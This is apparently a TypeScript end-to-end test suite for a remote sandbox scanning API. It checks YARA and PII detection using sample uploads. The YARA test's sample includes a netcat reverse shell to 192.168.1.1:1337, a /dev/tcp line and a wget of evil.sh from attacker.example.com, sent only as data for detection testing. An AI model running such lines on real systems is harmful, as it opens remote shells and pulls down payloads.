import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import FormData from 'form-data';
import fetch from 'node-fetch';

type JsonRecord = Record<string, unknown>;

function resolveApiBaseUrl(): string {
  const raw = process.env.TEST_API_URL?.trim();
  if (!raw) {
    throw new Error('TEST_API_URL is required for remote e2e tests');
  }

  const url = new URL(raw);
  url.pathname = url.pathname.replace(/\/+$/, '');
  return url.toString().replace(/\/+$/, '');
}

function apiUrl(baseUrl: string, route: string): string {
  return `${baseUrl}${route.startsWith('/') ? route : `/${route}`}`;
}

async function submitSandboxRun(
  baseUrl: string,
  fileContent: string,
  fileName: string,
  detectors: object[],
): Promise<{ status: number; body: JsonRecord }> {
  const tmpPath = path.join(
    os.tmpdir(),
    `sandbox-remote-${Date.now()}-${fileName}`,
  );
  fs.writeFileSync(tmpPath, fileContent, 'utf8');

  try {
    const form = new FormData();
    form.append('file', fs.createReadStream(tmpPath), fileName);
    form.append('detectors', JSON.stringify(detectors));
    const contentLength = await new Promise<number>((resolve, reject) => {
      form.getLength((error, length) => {
        if (error) {
          reject(error);
          return;
        }
        resolve(length);
      });
    });
    const headers = form.getHeaders({
      'content-length': String(contentLength),
    });

    const res = await fetch(apiUrl(baseUrl, '/sandbox/runs'), {
      method: 'POST',
      body: form,
      headers,
    });
    const rawBody = await res.text();
    let body: JsonRecord;
    try {
      body = JSON.parse(rawBody) as JsonRecord;
    } catch {
      throw new Error(
        `Remote sandbox request returned HTTP ${res.status} with non-JSON body: ${rawBody || '<empty>'}`,
      );
    }

    return {
      status: res.status,
      body,
    };
  } finally {
    fs.unlinkSync(tmpPath);
  }
}

async function waitForTerminalRun(
  baseUrl: string,
  runId: string,
  timeoutMs = 180_000,
): Promise<JsonRecord> {
  const deadline = Date.now() + timeoutMs;

  while (Date.now() < deadline) {
    const res = await fetch(apiUrl(baseUrl, `/sandbox/runs/${runId}`));
    const body = (await res.json()) as JsonRecord;
    if (res.status !== 200) {
      throw new Error(`Failed to fetch run ${runId}: HTTP ${res.status}`);
    }

    const status = typeof body.status === 'string' ? body.status : '';
    if (status === 'COMPLETED' || status === 'ERROR') {
      return body;
    }

    await new Promise((resolve) => setTimeout(resolve, 1000));
  }

  throw new Error(`Timed out waiting for remote run ${runId}`);
}

describe('API Remote E2E', () => {
  const baseUrl = resolveApiBaseUrl();
  const createdRunIds: string[] = [];

  afterAll(async () => {
    await Promise.all(
      createdRunIds.map(async (runId) => {
        try {
          await fetch(apiUrl(baseUrl, `/sandbox/runs/${runId}`), {
            method: 'DELETE',
          });
        } catch {
          // best-effort cleanup only
        }
      }),
    );
  });

  it('responds to /ping', async () => {
    const res = await fetch(apiUrl(baseUrl, '/ping'));
    const text = await res.text();

    expect(res.status).toBe(200);
    expect(text).toBe('pong');
  });

  it('detects YARA findings for malicious sandbox content', async () => {
    const maliciousContent = [
      'eval("payload")',
      'exec("cmd")',
      'system("id")',
      'nc -e /bin/bash 192.168.1.1 1337',
      '/dev/tcp/192.168.1.1/1337',
      'wget http://attacker.example.com/evil.sh',
    ].join('\n');

    const { status, body } = await submitSandboxRun(
      baseUrl,
      maliciousContent,
      'remote-yara-sample.txt',
      [{ type: 'YARA', enabled: true, config: {} }],
    );

    expect(status).toBe(201);
    createdRunIds.push(String(body.id));

    const completed = await waitForTerminalRun(baseUrl, String(body.id));
    expect(completed.status).toBe('COMPLETED');
    expect(completed.fileType).toBe('text/plain');

    const findings = completed.findings as JsonRecord[];
    const ruleNames = findings.map((finding) => String(finding.finding_type));
    expect(ruleNames).toContain('Potential_Code_Injection');
  });

  it('detects PII findings for JSON and YAML sandbox uploads', async () => {
    const cases = [
      {
        fileName: 'remote-customer.json',
        expectedMimeType: 'application/json',
        content: JSON.stringify(
          {
            customer: {
              name: 'Jane Doe',
              email: 'jane.doe@example.com',
              phone: '+1 415-555-0199',
              credit_card: '4111 1111 1111 1111',
            },
          },
          null,
          2,
        ),
      },
      {
        fileName: 'remote-customer.yml',
        expectedMimeType: 'text/plain',
        content: [
          'customer:',
          '  name: Jane Doe',
          '  email: jane.doe@example.com',
          '  phone: +1 415-555-0199',
          '  credit_card: 4111 1111 1111 1111',
        ].join('\n'),
      },
    ];

    for (const testCase of cases) {
      const { status, body } = await submitSandboxRun(
        baseUrl,
        testCase.content,
        testCase.fileName,
        [{ type: 'PII', enabled: true, config: {} }],
      );

      expect(status).toBe(201);
      createdRunIds.push(String(body.id));

      const completed = await waitForTerminalRun(baseUrl, String(body.id));
      expect(completed.status).toBe('COMPLETED');
      expect(completed.fileType).toBe(testCase.expectedMimeType);

      const findings = completed.findings as JsonRecord[];
      const findingTypes = findings.map((finding) =>
        String(finding.finding_type),
      );
      const matchedContent = findings.map((finding) =>
        String(finding.matched_content),
      );

      expect(findings.length).toBeGreaterThan(0);
      expect(findingTypes).toEqual(
        expect.arrayContaining([
          'EMAIL_ADDRESS',
          'PHONE_NUMBER',
          'CREDIT_CARD',
        ]),
      );
      expect(matchedContent).toEqual(
        expect.arrayContaining([
          expect.stringContaining('jane.doe@example.com'),
          expect.stringContaining('415-555-0199'),
          expect.stringContaining('4111 1111 1111 1111'),
        ]),
      );
    }
  });
});
